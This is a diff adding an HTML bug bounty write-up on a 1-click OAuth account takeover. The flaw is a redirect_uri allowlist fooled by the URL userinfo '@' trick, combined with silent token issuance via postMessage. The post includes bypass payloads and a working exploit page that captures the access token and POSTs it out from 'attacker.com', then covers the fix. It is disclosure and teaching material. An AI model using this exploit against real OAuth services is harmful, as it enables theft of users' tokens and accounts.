@@ -1,0 +1,706 @@
+<!doctype html>
+<html lang="en"><head>
+<title>How a Single @ Symbol Turned Into a 1-Click Account Takeover</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+    font-family: 'Inter', -apple-system, sans-serif;
+    font-size: 16px;
+    color: #c9cdd3;
+    background: transparent;
+    padding: 0;
+    max-width: 100%;
+    text-rendering: optimizeLegibility;
+    -webkit-font-smoothing: antialiased;
+}
+
+/* --- SIDE NAV --- */
+.sidenav {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 260px;
+    height: 100vh;
+    background: rgba(10, 12, 18, 0.85);
+    border-right: 1px solid #1e2130;
+    padding: 28px 20px;
+    overflow-y: auto;
+    z-index: 100;
+    display: flex;
+    flex-direction: column;
+}
+
+.sidenav-logo {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    text-decoration: none !important;
+    color: #fff !important;
+    font-weight: 700;
+    font-size: 16px;
+    margin-bottom: 32px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid #1e2130;
+}
+
+.sidenav-logo:hover .name {
+    text-decoration: underline;
+    text-decoration-color: #a78bfa;
+    text-underline-offset: 4px;
+}
+
+.sidenav-logo .prompt {
+    font-family: 'JetBrains Mono', Consolas, monospace;
+    font-size: 13px;
+    font-weight: 700;
+    color: #8b5cf6;
+}
+
+.sidenav-logo .prompt .cursor {
+    animation: blink 1s step-end infinite;
+}
+
+@keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0; }
+}
+
+.sidenav-section {
+    margin-bottom: 28px;
+}
+
+.sidenav-section-title {
+    font-size: 10px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    color: #555;
+    margin-bottom: 0;
+    padding: 8px 0;
+    cursor: default;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+}
+
+.sidenav-section-title::after {
+    content: '\25B8';
+    font-size: 10px;
+    transition: transform 0.2s;
+}
+
+.sidenav-section:hover .sidenav-section-title::after {
+    transform: rotate(90deg);
+}
+
+.sidenav-toc {
+    max-height: 0;
+    overflow: hidden;
+    transition: max-height 0.35s ease;
+}
+
+.sidenav-section:hover .sidenav-toc {
+    max-height: 500px;
+}
+
+.sidenav-toc a {
+    display: block;
+    font-size: 13px;
+    color: #666;
+    text-decoration: none;
+    padding: 6px 0 6px 12px;
+    border-left: 2px solid transparent;
+    transition: all 0.2s;
+    line-height: 1.4;
+}
+
+.sidenav-toc a:hover {
+    color: #a78bfa;
+    border-left-color: #a78bfa;
+    text-decoration: none;
+}
+
+.sidenav-toc a.active {
+    color: #a78bfa;
+    border-left-color: #a78bfa;
+}
+
+.sidenav-posts {
+    max-height: 0;
+    overflow: hidden;
+    transition: max-height 0.35s ease;
+}
+
+.sidenav-section:hover .sidenav-posts {
+    max-height: 400px;
+}
+
+.sidenav-posts a {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    text-decoration: none;
+    padding: 10px 12px;
+    border-radius: 8px;
+    transition: background 0.2s;
+    margin-bottom: 4px;
+}
+
+.sidenav-posts a:hover {
+    background: rgba(255, 255, 255, 0.04);
+    text-decoration: none;
+}
+
+.sidenav-posts a.current {
+    background: rgba(99, 102, 241, 0.08);
+}
+
+.sidenav-posts .dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    margin-top: 6px;
+    flex-shrink: 0;
+}
+
+.sidenav-posts .dot.purple { background: #a78bfa; }
+.sidenav-posts .dot.red { background: #f87171; }
+.sidenav-posts .dot.teal { background: #5eead4; }
+
+.sidenav-posts .post-title {
+    font-size: 13px;
+    color: #888;
+    line-height: 1.4;
+    transition: color 0.2s;
+}
+
+.sidenav-posts a:hover .post-title { color: #c9cdd3; }
+.sidenav-posts a.current .post-title { color: #e2e5ea; font-weight: 500; }
+
+.sidenav-bottom {
+    margin-top: auto;
+    padding-top: 20px;
+    border-top: 1px solid #1e2130;
+}
+
+.sidenav-bottom a {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 13px;
+    color: #555;
+    text-decoration: none;
+    padding: 6px 0;
+    transition: color 0.2s;
+}
+
+.sidenav-bottom a:hover { color: #a78bfa; text-decoration: none; }
+
+/* --- MAIN CONTENT --- */
+.post-wrapper {
+    max-width: 760px;
+    padding: 40px 30px 80px;
+    margin-left: max(290px, calc(260px + (100vw - 1020px) / 2));
+    margin-right: auto;
+}
+
+.back { display: none; }
+
+h1 {
+    font-size: 32px;
+    font-weight: 800;
+    color: #fff;
+    line-height: 1.25;
+    margin-bottom: 12px;
+}
+
+.meta {
+    color: #666;
+    font-size: 14px;
+    font-weight: 500;
+    margin-bottom: 40px;
+    padding-bottom: 30px;
+    border-bottom: 1px solid #1e2130;
+}
+
+h2 {
+    font-size: 22px;
+    font-weight: 700;
+    color: #fff;
+    margin-top: 48px;
+    margin-bottom: 16px;
+    scroll-margin-top: 24px;
+}
+
+p, li {
+    font-size: 17px;
+    line-height: 1.75;
+    color: #b0b5bd;
+    margin-bottom: 16px;
+}
+
+li { margin-bottom: 8px; }
+
+ul, ol {
+    padding-left: 24px;
+    margin-bottom: 16px;
+}
+
+a { color: #a78bfa; text-decoration: none; }
+a:hover { color: #c4b5fd; text-decoration: underline; }
+
+strong { color: #e2e5ea; font-weight: 600; }
+em { font-style: italic; color: #9ca0a8; }
+
+code {
+    font-family: 'JetBrains Mono', Consolas, monospace;
+    font-size: 14px;
+    background: rgba(99, 102, 241, 0.1);
+    color: #a78bfa;
+    padding: 2px 7px;
+    border-radius: 4px;
+    border: 1px solid rgba(99, 102, 241, 0.15);
+}
+
+pre {
+    background: #161822;
+    border: 1px solid #1e2130;
+    border-radius: 10px;
+    padding: 20px 24px;
+    overflow-x: auto;
+    margin: 20px 0 24px;
+    line-height: 1.6;
+}
+
+pre code {
+    background: none;
+    border: none;
+    padding: 0;
+    color: #c9cdd3;
+    font-size: 14px;
+}
+
+pre code .k { color: #f472b6; }
+pre code .s { color: #a6e22e; }
+pre code .f { color: #66d9ef; }
+pre code .c { color: #636678; font-style: italic; }
+pre code .n { color: #ae81ff; }
+pre code .p { color: #fd971f; }
+
+blockquote {
+    border-left: 3px solid #6366f1;
+    margin: 24px 0;
+    padding: 12px 20px;
+    background: rgba(99, 102, 241, 0.05);
+    border-radius: 0 8px 8px 0;
+}
+
+blockquote p { color: #9ca0a8; margin-bottom: 0; }
+
+hr {
+    border: none;
+    border-top: 1px solid #1e2130;
+    margin: 48px 0;
+}
+
+table {
+    border-collapse: collapse;
+    margin: 20px 0;
+    width: 100%;
+    border-radius: 8px;
+    overflow: hidden;
+    border: 1px solid #1e2130;
+}
+
+th, td {
+    border: 1px solid #1e2130;
+    padding: 10px 14px;
+    text-align: left;
+    font-size: 15px;
+}
+
+th {
+    background: #161822;
+    font-weight: 600;
+    color: #e2e5ea;
+}
+
+td { color: #b0b5bd; }
+
+/* --- MOBILE --- */
+.mobile-header {
+    display: none;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    background: #0c0e14;
+    border-bottom: 1px solid #1e2130;
+    padding: 12px 20px;
+    align-items: center;
+    justify-content: space-between;
+}
+
+.mobile-header .logo {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    text-decoration: none;
+    color: #fff;
+    font-weight: 700;
+    font-size: 16px;
+}
+
+.mobile-header .prompt {
+    font-family: 'JetBrains Mono', Consolas, monospace;
+    font-size: 13px;
+    font-weight: 700;
+    color: #8b5cf6;
+}
+
+.mobile-header .prompt .cursor {
+    animation: blink 1s step-end infinite;
+}
+
+.menu-btn {
+    background: none;
+    border: 1px solid #1e2130;
+    border-radius: 6px;
+    padding: 6px 10px;
+    color: #888;
+    cursor: pointer;
+    font-size: 18px;
+    transition: color 0.2s, border-color 0.2s;
+}
+
+.menu-btn:hover { color: #fff; border-color: #555; }
+
+.sidenav-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.6);
+    z-index: 99;
+}
+
+@media (max-width: 1060px) {
+    .sidenav {
+        transform: translateX(-100%);
+        transition: transform 0.3s ease;
+    }
+    .sidenav.open {
+        transform: translateX(0);
+    }
+    .sidenav-overlay.open {
+        display: block;
+    }
+    .mobile-header {
+        display: flex;
+    }
+    .post-wrapper {
+        margin-left: 0;
+        padding: 24px 20px 60px;
+    }
+    h1 { font-size: 24px; }
+    pre { padding: 14px 16px; }
+}
+</style>
+</head>
+<body>
+
+<!-- MOBILE HEADER -->
+<div class="mobile-header">
+    <a class="logo" href="../">
+        <span class="prompt">&gt;<span class="cursor">_</span></span>
+        <span class="name">naaash</span>
+    </a>
+    <button class="menu-btn" onclick="toggleNav()">&#9776;</button>
+</div>
+
+<!-- SIDE NAV -->
+<div class="sidenav-overlay" onclick="toggleNav()"></div>
+<nav class="sidenav">
+    <a class="sidenav-logo" href="../">
+        <span class="prompt">&gt;<span class="cursor">_</span></span>
+        <span class="name">naaash</span>
+    </a>
+
+    <div class="sidenav-section">
+        <div class="sidenav-section-title">On this page</div>
+        <div class="sidenav-toc">
+            <a href="#setup">The Setup</a>
+            <a href="#allowlist">The Allowlist</a>
+            <a href="#rfc3986">RFC 3986 and the Userinfo Component</a>
+            <a href="#token-delivery">The Token Delivery Mechanism</a>
+            <a href="#consent">Killing the Consent Screen</a>
+            <a href="#exploit">The Full Exploit</a>
+            <a href="#impact">What the Token Unlocks</a>
+            <a href="#fix">The Fix</a>
+            <a href="#takeaways">Takeaways</a>
+        </div>
+    </div>
+
+    <div class="sidenav-section">
+        <div class="sidenav-section-title">All Posts</div>
+        <div class="sidenav-posts">
+            <a href="oauth-redirect-bypass.html" class="current">
+                <span class="dot purple"></span>
+                <span class="post-title">How a Single @ Symbol Turned Into a 1-Click Account Takeover</span>
+            </a>
+            <a href="adobe-workfront.html">
+                <span class="dot red"></span>
+                <span class="post-title">Making Almost $50,000 In Bounties From The Adobe VIP Program</span>
+            </a>
+            <a href="tiktok-idor.html">
+                <span class="dot teal"></span>
+                <span class="post-title">A Tale of Confusing IDOR</span>
+            </a>
+        </div>
+    </div>
+
+    <div class="sidenav-bottom">
+        <a href="https://x.com/_naaash_" target="_blank">
+            <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+            @_naaash_
+        </a>
+        <a href="https://hackerone.com/naaash" target="_blank">
+            <svg viewBox="0 0 14 24" width="12" height="14" fill="currentColor"><path d="M2.83151 0.29796C2.49766 0.0989079 2.13142 0 1.66552 0C1.16599 0 0.766114 0.0989079 0.465897 0.29796C0.166926 0.495776 0 0.760354 0 1.0917V22.8762C0 23.1407 0.166926 23.4053 0.465897 23.6365C0.799749 23.8677 1.16599 24 1.63189 24C2.0492 24.0012 2.45655 23.8739 2.79787 23.6365C3.13048 23.4053 3.29741 23.1407 3.29741 22.8762V1.0917C3.33104 0.760354 3.16411 0.495776 2.83151 0.29796ZM5.59575 11.7354C5.39643 11.9345 5.29553 12.199 5.3628 12.5947C5.39643 12.9915 5.56211 13.355 5.89597 13.6864C6.19494 14.0165 6.56118 14.2477 6.96105 14.3478C7.36093 14.4467 7.66114 14.38 7.86046 14.2155L9.62563 13.1238V22.8762C9.62563 23.1407 9.79256 23.4053 10.0928 23.6365C10.3917 23.8677 10.7916 24 11.2575 24C11.7247 24 12.1245 23.8677 12.4571 23.6365C12.7897 23.4053 12.9567 23.1407 12.9567 22.8762V9.71893C12.9567 9.38883 12.7897 9.15763 12.4571 8.95858C12.1245 8.76076 11.7247 8.66185 11.2251 8.66185C10.7256 8.66185 10.3594 8.76076 10.0591 8.95858L5.59575 11.7354Z"/></svg>
+            HackerOne
+        </a>
+        <a href="https://www.linkedin.com/in/avinashsudheer/" target="_blank">
+            <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+            LinkedIn
+        </a>
+    </div>
+</nav>
+
+<!-- MAIN CONTENT -->
+<div class="post-wrapper">
+
+<a class="back" href="../">&larr; Back to all posts</a>
+
+<h1>How a Single <code>@</code> Symbol Turned Into a 1-Click Account Takeover</h1>
+<div class="meta">Bug Bounty Research &middot; OAuth Security</div>
+
+<p>Sometimes the most devastating bugs hide behind the simplest payloads. This is the story of how I stole OAuth access tokens, granting broad access across a victim's account, from any authenticated user of a major productivity platform. One click. No consent prompt. No interaction beyond the initial tap.</p>
+
+<p>The entire exploit hinged on a single character: <code>@</code>.</p>
+
+<hr>
+
+<h2 id="setup">The Setup</h2>
+
+<p>The target was a large-scale productivity platform serving tens of millions of users. The platform uses an internal OAuth 2.0 authorization server to handle token issuance for its first-party clients. Web applications across the ecosystem request tokens from this central endpoint, and the tokens are delivered back to the requesting page via <code>postMessage</code>.</p>
+
+<p>I was looking at the OAuth login endpoint and its handling of <code>redirect_uri</code>. This is a parameter every OAuth implementation must validate carefully because it tells the server <em>where to send the token</em>. If an attacker can inject their own domain here, the victim's token gets sent to the attacker instead.</p>
+
+<p>Most mature implementations validate <code>redirect_uri</code> against a strict allowlist. This one did too. Or so it appeared.</p>
+
+<h2 id="allowlist">The Allowlist</h2>
+
+<p>The OAuth endpoint accepted a specific first-party <code>client_id</code>, the one used by the platform's own client. For this client, the allowed <code>redirect_uri</code> was the application domain. Let's call it <code>app.example.com</code>.</p>
+
+<p>I started with the obvious bypass attempts:</p>
+
+<pre><code><span class="p">redirect_uri</span>=<span class="s">https://app.example.com.evil.com</span>      <span class="c">&rarr; rejected</span>
+<span class="p">redirect_uri</span>=<span class="s">https://evil.com/app.example.com</span>       <span class="c">&rarr; rejected</span>
+<span class="p">redirect_uri</span>=<span class="s">https://app.example.com%2e.evil.com</span>    <span class="c">&rarr; rejected</span>
+<span class="p">redirect_uri</span>=<span class="s">https://app.example.com/.evil.com</span>      <span class="c">&rarr; rejected</span></code></pre>
+
+<p>Strict. Good. I tried subdomain variations, path traversals, fragment injection, URL encoding tricks, unicode normalization, null bytes. 40+ payloads. All rejected.</p>
+
+<p>Then I tried the <code>@</code>.</p>
+
+<h2 id="rfc3986">RFC 3986 and the Userinfo Component</h2>
+
+<p>There's a piece of URL syntax that most developers never think about. Per RFC 3986, an HTTP URL has this structure:</p>
+
+<pre><code><span class="s">https://</span><span class="p">userinfo</span><span class="k">@</span><span class="f">host</span>:<span class="n">port</span>/<span class="c">path</span></code></pre>
+
+<p>The <strong>userinfo</strong> component (everything before <code>@</code>) is technically valid syntax. Browsers have historically supported it, though most now strip or ignore it. Critically, the <strong>host</strong> is whatever comes <em>after</em> the <code>@</code>.</p>
+
+<p>So what happens if the OAuth server is doing string matching instead of proper URL parsing?</p>
+
+<pre><code><span class="p">redirect_uri</span>=<span class="s">https://app.example.com</span><span class="k">@</span><span class="f">attacker.com</span></code></pre>
+
+<p>The server scans the string, finds <code>app.example.com</code>, and says: "looks good." But the actual host, the domain the browser resolves and the domain that receives the request, is <code>attacker.com</code>.</p>
+
+<p>I sent it. The server accepted it.</p>
+
+<h2 id="token-delivery">The Token Delivery Mechanism</h2>
+
+<p>An important nuance: this was <strong>not</strong> an open redirect. The server never issued a <code>302</code> redirect to the attacker's domain. There was no navigation, no HTTP response splitting, no Location header pointing somewhere it shouldn't. If you were looking for a traditional redirect-based OAuth token theft, you wouldn't find one here.</p>
+
+<p>Instead, the OAuth server returned an HTML page that stayed on its own origin and delivered the token via <code>postMessage</code>:</p>
+
+<pre><code><span class="f">source</span>.<span class="f">postMessage</span>(
+    <span class="s">'{"type":"auth","detail":{"access_token":"TOKEN_HERE"}}'</span>,
+    <span class="s">"https://app.example.com@attacker.com"</span>
+);
+<span class="f">window</span>.<span class="f">close</span>();</code></pre>
+
+<p>The second argument to <code>postMessage</code> is the <strong>target origin</strong>. The browser must parse this string to determine which window is allowed to receive the message.</p>
+
+<p>Here's the thing: browsers parse origins correctly. When the browser sees <code>https://app.example.com@attacker.com</code> as an origin, it strips the userinfo and resolves the origin as <code>https://attacker.com</code>.</p>
+
+<p>So the token is delivered via <code>postMessage</code> to any window with origin <code>https://attacker.com</code>.</p>
+
+<p>If the attacker opened this OAuth popup from their own page on <code>attacker.com</code>, they receive the token. The popup closes immediately. The user saw a window flash for less than a second.</p>
+
+<h2 id="consent">Killing the Consent Screen</h2>
+
+<p>There was one more piece. The OAuth endpoint supports a <code>mode=hidden</code> parameter, designed for silent token renewal when the user already has an active session. When this parameter is set, no consent screen is shown. No "Allow this app to access your data?" dialog. Nothing.</p>
+
+<p>Combined with the redirect_uri bypass, this meant: if the victim is logged in, the token is issued and delivered silently. Zero interaction beyond the initial click.</p>
+
+<h2 id="exploit">The Full Exploit</h2>
+
+<p>The attack flow:</p>
+
+<p>1. Attacker hosts a page on <code>https://attacker.com</code>:</p>
+
+<pre><code><span class="f">window</span>.<span class="f">addEventListener</span>(<span class="s">'message'</span>, <span class="k">function</span>(<span class="p">event</span>) {
+    <span class="k">var</span> data = <span class="f">JSON</span>.<span class="f">parse</span>(<span class="p">event</span>.data);
+    <span class="k">if</span> (data.type === <span class="s">'auth'</span> &amp;&amp; data.detail.access_token) {
+        <span class="c">// Token stolen. Exfiltrate.</span>
+        <span class="f">fetch</span>(<span class="s">'/collect'</span>, {
+            method: <span class="s">'POST'</span>,
+            body: <span class="f">JSON</span>.<span class="f">stringify</span>(data.detail)
+        });
+    }
+});
+
+<span class="f">document</span>.onclick = <span class="k">function</span>() {
+    <span class="f">window</span>.<span class="f">open</span>(
+        <span class="s">'https://oauth.target.com/login?'</span> +
+        <span class="s">'client_id=FIRST_PARTY_CLIENT_ID'</span> +
+        <span class="s">'&amp;redirect_uri='</span> + <span class="f">encodeURIComponent</span>(<span class="s">'https://app.example.com@attacker.com'</span>) +
+        <span class="s">'&amp;response_type=token'</span> +
+        <span class="s">'&amp;scope=REDACTED'</span> +
+        <span class="s">'&amp;mode=hidden'</span>
+    );
+};</code></pre>
+
+<p>2. Victim visits the page while logged in. Clicks anywhere.</p>
+
+<p>3. A popup opens to the OAuth server. The server validates <code>redirect_uri</code>, sees the trusted domain in the string, accepts it.</p>
+
+<p>4. The server issues an access token with all requested scopes and delivers it via <code>postMessage</code> to <code>https://app.example.com@attacker.com</code>. The browser resolves this as <code>https://attacker.com</code>.</p>
+
+<p>5. The attacker's <code>message</code> listener fires, extracts the token, exfiltrates it.</p>
+
+<p>6. The popup auto-closes. The victim noticed nothing beyond a brief flicker.</p>
+
+<h2 id="impact">What the Token Unlocks</h2>
+
+<p>The stolen token was issued with the same privileges as the platform's own first-party client. It granted broad access across the victim's account: profile data, private messages, stored files, and connected services. The kind of access that, in the wrong hands, means full account compromise without ever touching the user's password.</p>
+
+<p>With a valid token, the attacker could silently query internal APIs to pull PII, read private content, and enumerate data across every integrated service the platform offers. No rate limiting was observed on the APIs accepting these tokens, and the tokens had a long enough lifetime to do serious damage before expiry.</p>
+
+<p>The bottom line: one click gave the attacker the same level of access as if they'd logged in as the victim.</p>
+
+<h2 id="fix">The Fix</h2>
+
+<p>After reporting, the team deployed a fix that:</p>
+
+<p>1. Rejects any <code>redirect_uri</code> containing a <code>@</code> in the authority component<br>
+2. Parses the URL properly and validates the extracted hostname against the allowlist</p>
+
+<p>Post-patch, I retested with 48 bypass variants: path traversals, encoding tricks, subdomain abuse, fragment injection, null bytes. All rejected. The fix was solid.</p>
+
+<h2 id="takeaways">Takeaways</h2>
+
+<p><strong>For builders:</strong></p>
+<ul>
+<li>Never validate URLs with string matching. Always parse first, then validate the parsed components. <code>urlparse</code> exists in every language. Use it.</li>
+<li>The userinfo <code>@</code> bypass is ancient, but it still shows up in production OAuth implementations. Add it to your security test suite.</li>
+<li><code>postMessage</code> target origins are parsed by the browser, not by your server. If there's any discrepancy between how your server interprets a URL and how the browser does, you have a bug.</li>
+<li><code>mode=hidden</code> or silent token flows need their own security boundary. If the redirect_uri is compromised, silent mode turns a redirect into a full silent takeover.</li>
+</ul>
+
+<p><strong>For hunters:</strong></p>
+<ul>
+<li>Don't give up after 40 rejected payloads. The 41st might be a single character.</li>
+<li>When you see <code>postMessage</code>-based token delivery, test the target origin parsing. The server and the browser might disagree about what a URL means.</li>
+<li>First-party OAuth clients are high-value targets. They often have broader scopes and weaker restrictions than third-party clients.</li>
+</ul>
+
+</div>
+
+<script>
+function toggleNav() {
+    document.querySelector('.sidenav').classList.toggle('open');
+    document.querySelector('.sidenav-overlay').classList.toggle('open');
+}
+
+document.querySelectorAll('.sidenav-toc a').forEach(function(link) {
+    link.addEventListener('click', function() {
+        if (window.innerWidth <= 1060) toggleNav();
+    });
+});
+
+var tocLinks = document.querySelectorAll('.sidenav-toc a');
+var headings = [];
+tocLinks.forEach(function(link) {
+    var id = link.getAttribute('href').slice(1);
+    var el = document.getElementById(id);
+    if (el) headings.push({ el: el, link: link });
+});
+
+window.addEventListener('scroll', function() {
+    var scrollPos = window.scrollY + 80;
+    var current = null;
+    headings.forEach(function(h) {
+        if (h.el.offsetTop <= scrollPos) current = h;
+    });
+    tocLinks.forEach(function(l) { l.classList.remove('active'); });
+    if (current) current.link.classList.add('active');
+});
+</script>
+<canvas id="bg" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;pointer-events:none;background:#0c0e14;"></canvas>
+<script>
+(function() {
+    var c = document.getElementById('bg'), ctx = c.getContext('2d'), w, h;
+    var palette = ['#6366f1','#8b5cf6','#a78bfa','#4f46e5','#c4b5fd'];
+    function resize() { w = c.width = window.innerWidth; h = c.height = window.innerHeight; }
+    resize(); window.addEventListener('resize', resize);
+    var lines = [];
+    for (var i = 0; i < 70; i++) lines.push({ x:0, y:0, len:0, hz:true, a:0, t:0, col:palette[0], tm: Math.random()*60 });
+    var chars = [];
+    for (var i = 0; i < 35; i++) chars.push({ x:0, y:0, ch:'', a:0, t:0, tm: Math.random()*40, col:palette[0], sz:12 });
+    var gl = '01@#$%&*></{}>_~;:=+!?root$ssh://0xDEAD0xBEEF'.split('');
+    function draw() {
+        ctx.clearRect(0, 0, w, h);
+        for (var i = 0; i < lines.length; i++) {
+            var l = lines[i];
+            if (--l.tm <= 0) {
+                if (l.a < 0.02) { l.x = Math.random()*w; l.y = Math.random()*h; l.len = Math.random()*200+40; l.hz = Math.random()>0.4; l.t = Math.random()*0.5+0.15; l.tm = Math.random()*15+3; l.col = palette[Math.floor(Math.random()*palette.length)]; }
+                else { l.t = 0; l.tm = Math.random()*60+20; }
+            }
+            l.a += (l.t - l.a) * 0.15;
+            if (l.a > 0.01) { ctx.strokeStyle = l.col; ctx.globalAlpha = l.a; ctx.lineWidth = Math.random()<0.2 ? 2.5 : 1; ctx.beginPath(); if (l.hz) { ctx.moveTo(l.x, l.y); ctx.lineTo(l.x+l.len, l.y); } else { ctx.moveTo(l.x, l.y); ctx.lineTo(l.x, l.y+l.len); } ctx.stroke(); }
+        }
+        for (var i = 0; i < chars.length; i++) {
+            var ch = chars[i];
+            if (--ch.tm <= 0) {
+                if (ch.a < 0.02) { ch.x = Math.random()*w; ch.y = Math.random()*h; ch.ch = gl[Math.floor(Math.random()*gl.length)]; ch.t = Math.random()*0.6+0.15; ch.tm = Math.random()*10+2; ch.col = palette[Math.floor(Math.random()*palette.length)]; ch.sz = [11,13,15,18][Math.floor(Math.random()*4)]; }
+                else { ch.t = 0; ch.tm = Math.random()*50+15; }
+            }
+            ch.a += (ch.t - ch.a) * 0.15;
+            if (ch.a > 0.01) { ctx.globalAlpha = ch.a; ctx.fillStyle = ch.col; ctx.font = ch.sz + 'px JetBrains Mono,monospace'; ctx.fillText(ch.ch, ch.x, ch.y); }
+        }
+        if (Math.random() < 0.06) { ctx.globalAlpha = Math.random()*0.2+0.08; ctx.fillStyle = palette[Math.floor(Math.random()*palette.length)]; ctx.fillRect(0, Math.random()*h, w, Math.random()*3+1); }
+        if (Math.random() < 0.02) { ctx.globalAlpha = Math.random()*0.08+0.03; ctx.fillStyle = palette[Math.floor(Math.random()*palette.length)]; ctx.fillRect(Math.random()*w, Math.random()*h, Math.random()*300+50, Math.random()*20+5); }
+        ctx.globalAlpha = 1; requestAnimationFrame(draw);
+    }
+    draw();
+})();
+</script>
+</body></html>
